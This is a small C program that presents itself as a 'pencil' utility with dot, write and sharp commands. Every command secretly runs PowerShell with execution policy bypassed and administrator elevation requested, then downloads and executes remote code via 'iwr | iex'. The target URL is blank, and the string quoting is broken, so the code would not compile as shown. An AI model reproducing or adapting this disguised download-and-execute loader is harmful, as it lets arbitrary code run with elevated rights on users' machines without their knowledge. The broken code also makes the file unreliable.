#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: pencil <dot|write|sharp>\n");
        return 1;
    }

    if (strcmp(argv[1], "dot") == 0) {
        system("powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "iwr -useb "" | iex"' -Verb RunAs");
    } else if (strcmp(argv[1], "write") == 0) {
        system("powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "iwr -useb "" | iex"' -Verb RunAs");
    } else if (strcmp(argv[1], "sharp") == 0) {
        system("powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "iwr -useb "" | iex"' -Verb RunAs");
    } else {
        printf("Unknown command: %s\n", argv[1]);
    }

    return 0;
}

